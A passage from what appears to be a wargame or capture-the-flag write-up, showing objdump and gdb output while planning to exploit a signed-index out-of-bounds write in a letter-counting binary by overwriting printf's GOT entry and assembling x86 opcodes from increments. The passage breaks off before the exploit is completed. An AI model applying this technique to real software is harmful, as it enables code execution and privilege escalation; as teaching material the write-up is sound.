<p>Here the code is using the <code>j</code>th word (passed in on the command line via <code>argv</code>) and accessing its <code>i</code>th character, then using this character as an index into <code>count</code> to increment the count for that letter. The application is obviously doing a simple letter-tally. Straight up this looks like a potential point of attack because the values in <code>argv</code> are <em>signed</em> characters, and hence we can pass in values that are <strong>negative</strong> and write outside the bounds of the <code>count</code> array. Let&#8217;s <code>objdump</code> the binary to see where <code>count</code> lives:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt | grep count
</span><span class='line'>08049720 &lt;count&gt;:
</span></code></pre></td></tr></table></div></figure>


<p>The negative values we can use are from <code>CHAR_MIN</code> (<code>-128</code>) &times; <code>sizeof(int)</code> (<code>4</code> on a 32-bit system) to <code>0</code>. So with <code>count</code> located at <code>0x8049720</code>, it means we can write values from here, all the way back to <code>0x8049520</code>. Let&#8217;s see what fits within this range, again by looking at the output of <code>objdump</code>:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt
</span><span class='line'>... snip ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .ctors:
</span><span class='line'>
</span><span class='line'>080495ec &lt;__CTOR_LIST__&gt;:
</span><span class='line'> 80495ec: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ed: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ee: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495ef: ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>080495f0 &lt;__CTOR_END__&gt;:
</span><span class='line'> 80495f0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .dtors:
</span><span class='line'>
</span><span class='line'>080495f4 &lt;__DTOR_LIST__&gt;:
</span><span class='line'> 80495f4: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f5: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f6: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80495f7: ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>080495f8 &lt;__DTOR_END__&gt;:
</span><span class='line'> 80495f8: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .jcr:
</span><span class='line'>
</span><span class='line'>080495fc &lt;__JCR_END__&gt;:
</span><span class='line'> 80495fc: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .dynamic:
</span><span class='line'>
</span><span class='line'>08049600 &lt;_DYNAMIC&gt;:
</span><span class='line'> 8049600: 01 00                   add    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049602: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049604: 10 00                   adc    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049606: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049608: 0c 00                   or     <span class="nv">$0x0</span>,%al
</span><span class='line'> 804960a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804960c: 78 82                   js     8049590 &lt;__FRAME_END__+0xfa8&gt;
</span><span class='line'> 804960e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049610: 0d 00 00 00 9c          or     <span class="nv">$0x9c000000</span>,%eax
</span><span class='line'> 8049615: 85 04 08                <span class="nb">test</span>   %eax,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049618: 04 00                   add    <span class="nv">$0x0</span>,%al
</span><span class='line'> 804961a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804961c: 48                      dec    %eax
</span><span class='line'> 804961d: 81 04 08 f5 fe ff 6f    addl   <span class="nv">$0x6ffffef5</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049624: 70 81                   jo     80495a7 &lt;__FRAME_END__+0xfbf&gt;
</span><span class='line'> 8049626: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049628: 05 00 00 00 e0          add    <span class="nv">$0xe0000000</span>,%eax
</span><span class='line'> 804962d: 81 04 08 06 00 00 00    addl   <span class="nv">$0x6</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 8049634: 90                      nop
</span><span class='line'> 8049635: 81 04 08 0a 00 00 00    addl   <span class="nv">$0xa</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
</span><span class='line'> 804963c: 4c                      dec    %esp
</span><span class='line'> 804963d: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804963f: 00 0b                   add    %cl,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049641: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049643: 00 10                   add    %dl,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049645: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049647: 00 15 00 00 00 00       add    %dl,0x0
</span><span class='line'> 804964d: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804964f: 00 03                   add    %al,<span class="o">(</span>%ebx<span class="o">)</span>
</span><span class='line'> 8049651: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049653: 00 d4                   add    %dl,%ah
</span><span class='line'> 8049655: 96                      xchg   %eax,%esi
</span><span class='line'> 8049656: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049658: 02 00                   add    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804965a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965c: 18 00                   sbb    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804965e: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049660: 14 00                   adc    <span class="nv">$0x0</span>,%al
</span><span class='line'> 8049662: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049664: 11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049666: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049668: 17                      pop    %ss
</span><span class='line'> 8049669: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966b: 00 60 82                add    %ah,-0x7e<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804966e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049670: 11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049672: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049674: 58                      pop    %eax
</span><span class='line'> 8049675: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049676: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049678: 12 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%al
</span><span class='line'> 804967a: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967c: 08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 804967e: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049680: 13 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%eax
</span><span class='line'> 8049682: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049684: 08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049686: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049688: fe                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049689: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804968a: ff 6f 38                ljmp   *0x38<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804968d: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804968e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 8049690: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049691: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 8049692: ff 6f 01                ljmp   *0x1<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 8049695: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 8049697: 00 f0                   add    %dh,%al
</span><span class='line'> 8049699: ff                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804969a: ff 6f 2c                ljmp   *0x2c<span class="o">(</span>%edi<span class="o">)</span>
</span><span class='line'> 804969d: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 804969e: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .got:
</span><span class='line'>
</span><span class='line'>080496d0 &lt;.got&gt;:
</span><span class='line'> 80496d0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .got.plt:
</span><span class='line'>
</span><span class='line'>080496d4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:
</span><span class='line'> 80496d4: 00 96 04 08 00 00       add    %dl,0x804<span class="o">(</span>%esi<span class="o">)</span>
</span><span class='line'> 80496da: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496dc: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496de: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'> 80496e0: be 82 04 08 ce          mov    <span class="nv">$0xce080482</span>,%esi
</span><span class='line'> 80496e5: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80496e6: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'> 80496e8: de                      .byte 0xde
</span><span class='line'> 80496e9: 82                      <span class="o">(</span>bad<span class="o">)</span>
</span><span class='line'> 80496ea: 04 08                   add    <span class="nv">$0x8</span>,%al
</span><span class='line'>
</span><span class='line'>Disassembly of section .data:
</span><span class='line'>
</span><span class='line'>080496ec &lt;__data_start&gt;:
</span><span class='line'> 80496ec: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>080496f0 &lt;__dso_handle&gt;:
</span><span class='line'> 80496f0: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>Disassembly of section .bss:
</span><span class='line'>
</span><span class='line'>08049700 &lt;completed.5706&gt;:
</span><span class='line'> 8049700: 00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>08049704 &lt;dtor_idx.5708&gt;:
</span><span class='line'>  ...
</span><span class='line'>
</span><span class='line'>08049720 &lt;count&gt;:
</span><span class='line'>  ...
</span><span class='line'>... snip ...
</span></code></pre></td></tr></table></div></figure>


<p>As you can see, there area a few sections that we can write to:</p>

<ul>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.ctors</a> section is in range, but this isn&#8217;t going to help us because the code executed in constructors is executed before our code gets to execute.</li>
<li>The <a href="http://gcc.gnu.org/onlinedocs/gccint/Initialization.html">.dtors</a> section is in range, hence we might be able to write something to this section which would get executed when the program exits.</li>
<li>The <a href="http://bottomupcs.sourceforge.net/csbu/x3824.htm" title="Global Offset Tables">GOT</a> is in range, so perhaps we can look into overwriting a <code>GOT</code> entry with something else that will help us compromise the application.</li>
</ul>


<p>Let&#8217;s take a look at what&#8217;s in the <code>GOT</code>:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump --dynamic-reloc /levels/level07_alt
</span><span class='line'>
</span><span class='line'>/levels/level07_alt:     file format elf32-i386
</span><span class='line'>
</span><span class='line'>DYNAMIC RELOCATION RECORDS
</span><span class='line'>OFFSET   TYPE              VALUE
</span><span class='line'>080496d0 R_386_GLOB_DAT    __gmon_start__
</span><span class='line'>080496e0 R_386_JUMP_SLOT   __gmon_start__
</span><span class='line'>080496e4 R_386_JUMP_SLOT   __libc_start_main
</span><span class='line'>080496e8 R_386_JUMP_SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they&#8217;re not really options for attack. The last one, <code>printf</code>, looks promising because this doesn&#8217;t get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that&#8217;s stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here&#8217;s a (tidied) snapshot from <code>gdb</code>:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>x/128x 0x8049520
</span><span class='line'>0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
</span><span class='line'>0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
</span><span class='line'>0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
</span><span class='line'>0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
</span><span class='line'>0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
</span><span class='line'>0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
</span><span class='line'>0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
</span><span class='line'>0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
</span><span class='line'>0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
</span><span class='line'>0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
</span><span class='line'>0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
</span><span class='line'>0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
</span><span class='line'>0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
</span><span class='line'>0x80495f0 &lt;CTE&gt;     : 0x00000000      0xffffffff      0x00000000      0x00000000
</span><span class='line'>0x8049600 &lt;DYN&gt;     : 0x00000001      0x00000010      0x0000000c      0x08048278
</span><span class='line'>0x8049610 &lt;DYN+16&gt;  : 0x0000000d      0x0804859c      0x00000004      0x08048148
</span><span class='line'>0x8049620 &lt;DYN+32&gt;  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
</span><span class='line'>0x8049630 &lt;DYN+48&gt;  : 0x00000006      0x08048190      0x0000000a      0x0000004c
</span><span class='line'>0x8049640 &lt;DYN+64&gt;  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
</span><span class='line'>0x8049650 &lt;DYN+80&gt;  : 0x00000003      0x080496d4      0x00000002      0x00000018
</span><span class='line'>0x8049660 &lt;DYN+96&gt;  : 0x00000014      0x00000011      0x00000017      0x08048260
</span><span class='line'>0x8049670 &lt;DYN+112&gt; : 0x00000011      0x08048258      0x00000012      0x00000008
</span><span class='line'>0x8049680 &lt;DYN+128&gt; : 0x00000013      0x00000008      0x6ffffffe      0x08048238
</span><span class='line'>0x8049690 &lt;DYN+144&gt; : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
</span><span class='line'>0x80496a0 &lt;DYN+160&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496b0 &lt;DYN+176&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496c0 &lt;DYN+192&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
</span><span class='line'>0x80496e0 &lt;GOT+12&gt;  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  &lt;-- just here
</span><span class='line'>0x80496f0 &lt;DSO&gt;     : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
</span><span class='line'>0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
</span></code></pre></td></tr></table></div></figure>


<p>Where:</p>

<ul>
<li><code>CTE</code> -> CTOR END</li>
<li><code>DYN</code> -> DYNAMIC</li>
<li><code>GOT</code> -> GLOBAL OFFSET TABLE</li>
<li><code>DSO</code> -> DSO HANDLE</li>
</ul>


<p>Remember that the application only allows us to increment existing values one at a time for every &#8220;index&#8221; (ie. character) that is passed on the command line. As a result, this value is what we have to add start with, and any address we want to point to has to come after this. Unfortunately for us, there is a limitation on the command line which prevents us from passing in any more than 128k characters. This is going to bite us in the butt later on.</p>

<p>We need to be able to point this address to an area of memory that we control. It&#8217;d be great if we could point this straight at <code>argv</code>, but we can&#8217;t do that. Why? Because:</p>

<ol>
<li>The <code>count</code> array is an array of 32-bit integers. This means we can only increment whole <strong>word</strong> values, we can&#8217;t increment individual <em>bytes</em>.</li>
<li>Areas of memory that we control, such as <code>argv[N]</code>, are in the high address ranges (think something like <code>o0xbffff___</code>). To increment a word value from the <code>printf</code> source value to a value like this, or even another value on the stack, we would need to increment that value too many times. We don&#8217;t have the command-line character budget to be able to do that.</li>
</ol>


<p>This means that if we want to point the entry to something we control, we&#8217;re going to have to point it to <code>count</code> +/- 128 words. This comes with its own set of issues:</p>

<ul>
<li>Within this range we would need to craft our own instructions that get executed, using nothing but incrementing values.</li>
<li>Realistically, we can only write to the lower 2 bytes of each 4-byte word. If we attempt to write higher we either blow our budget or waste too many characters on a single instruction.</li>
<li>The area of memory that we know we have control over that has predictable values prior to our code running is the intended storage area for the <code>count</code> array and at the start of the program that entire area is set to <code>zero</code>.</li>
<li>To my knowledge, there&#8217;s no <code>GETROOT</code> instruction in x86 assembly, nor are there any instructions less than 3 bytes in size that can do something useful without other instructions working alongside them. This means writing multiple instructions to memory.</li>
<li>If we can only modify the lower 2 bytes, then the higher 2 bytes will remain <code>00 00</code>. Given that Intel x86 is little endian, this means that after our instructions those zero bytes will always be executed before our next instruction does.</li>
<li>The opcode <code>00 00</code> translates to <code>MOV [EAX], AL</code>, which means &#8220;take the value of the lower-order byte in <code>EAX</code> and store it in the location pointed to by <code>EAX</code>&#8221;. This means we can&#8217;t really use <code>EAX</code> for something useful because the code will attempt to write back to areas of memory that we are interested in, probably clobbering code or pointers that are important.</li>
</ul>


<p>Let&#8217;s take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>

<figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484d3
</span><span class='line'>Breakpoint 1 at 0x80484d3
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run abcd
</span><span class='line'>Starting program: /levels/level07_alt abcd
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484d3 in main <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info registers
</span><span class='line'>eax            0x61   97
</span><span class='line'>ecx            0xbffffcb0 -1073742672
</span><span class='line'>edx            0x80485d1  134514129
</span><span class='line'>ebx            0xb7fd1ff4 -1208147980
</span><span class='line'>esp            0xbffffc60 0xbffffc60
</span><span class='line'>ebp            0xbffffc98 0xbffffc98
</span><span class='line'>esi            0x0    0
</span><span class='line'>edi            0x0    0
</span><span class='line'>eip            0x80484d3  0x80484d3 &lt;main+303&gt;
</span><span class='line'>eflags         0x206  <span class="o">[</span> PF IF <span class="o">]</span>
</span><span class='line'>cs             0x23   35
</span><span class='line'>ss             0x2b   43
</span><span class='line'>ds             0x2b   43
</span><span class='line'>es             0x2b   43
</span><span class='line'>fs             0x0    0
</span><span class='line'>gs             0x63   99
</span></code></pre></td></tr></table></div></figure>


<p>What&#8217;s interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can&#8217;t let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We&#8217;re going to have to change this value to a valid pointer.</p>

<p>Also, take a look at <code>ECX</code>, as it&#8217;s value looks to be in a memory area that we have control over. It turns out that <code>ECX</code> contains a pointer to <code>argc</code>, the number of arguments passed to the program on the command line. What&#8217;s great about this, is that <code>argv</code> immediately follows it. That is, <code>argv</code> is located at <code>ECX+4</code>. Here we can see the start of a possible attack vector.</p>

<p>To get <code>ECX</code> to point to <code>argv[0]</code> and execute, we&#8217;d need to do the following (ASM with opcodes):</p>

<pre><code>INC ECX          41
INC ECX          41
INC ECX          41
INC ECX          41
MOV ECX, [ECX]   8B 09
JMP [ECX]        FF 21
</code></pre>

<p>This code increments <code>ECX</code> by <code>4</code>, then jumps to the address that is stored in the value <code>ECX</code> points to. This looks fine, but why can&#8217;t we do this? Firstly, we can&#8217;t have the instructions all close together like this. To write these values to the <code>count</code> array, we&#8217;d have to suffer the pain of having the double zero bytes in the way, like so:</p>

<pre><code>INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>This is made worse by the fact that <code>EAX</code> contains a crap address. Given that we don&#8217;t really care about the content of <code>ECX</code> which is just a counter of arguments passed to the program, we can overwrite <code>EAX</code> with <code>ECX</code> resulting in a valid pointer that references an address we don&#8217;t really care about. Each time the double-null instruction is executed, a 1-byte value will be written over the top of <code>argc</code>. No more crash!</p>

<pre><code>MOV EAX, ECX     89 C8
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
INC ECX          41
INC ECX          41
MOV [EAX], AL    00 00
MOV ECX, [ECX]   8B 09
MOV [EAX], AL    00 00
JMP [ECX]        FF 21
</code></pre>

<p>Therefore somewhere in <code>count</code> we need to write these values so that the memory looks like this (little-endian remember!):</p>

<pre><code>0x0000C889 0x00004141 0x00004141 0x0000098B 0x000021FF
</code></pre>

<p>Wherever we write this value, we need to know the location so that we can increment the <code>printf</code> <code>GOT</code> entry so that it points to the start of this code. Great, we&#8217;re well underway then, right?</p>

